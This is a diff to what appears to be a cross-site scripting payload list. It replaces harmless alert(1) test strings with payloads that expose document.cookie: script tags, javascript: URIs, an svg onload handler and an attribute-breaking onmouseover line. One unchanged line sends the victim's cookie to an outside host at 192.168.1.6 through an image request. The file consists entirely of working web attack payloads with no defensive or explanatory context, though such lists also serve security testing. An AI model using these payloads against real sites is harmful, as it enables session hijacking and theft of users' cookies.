@@ -1,8 +1,14 @@
-<script>alert(1)</script>
-<Script>alert(1)</Script>
+<script>alert(document.cookie)</script>
+</script><script>alert(document.cookie)</script>
+javascript:alert(document.cookie)
+javascript:prompt(document.cookie)
+'-alert(document.cookie)-'
+</script><svg onload=alert(document.cookie)>
+"onmouseover=alert(document.cookie)//
+<Script>alert(document.cookie)</Script>
 <sCript>alert(document.domain)</sCript>
-<script>alert(123);</script>
-<script>alert("Armour");</script>
+<script>alert(document.cookie);</script>
+<script>alert(document.cookie);</script>
 <script>alert(document.domain)</script>
 <script>alert(document.cookie)</script>
 <script>new Image().src="http://192.168.1.6/?c="+document.cookie;</script>
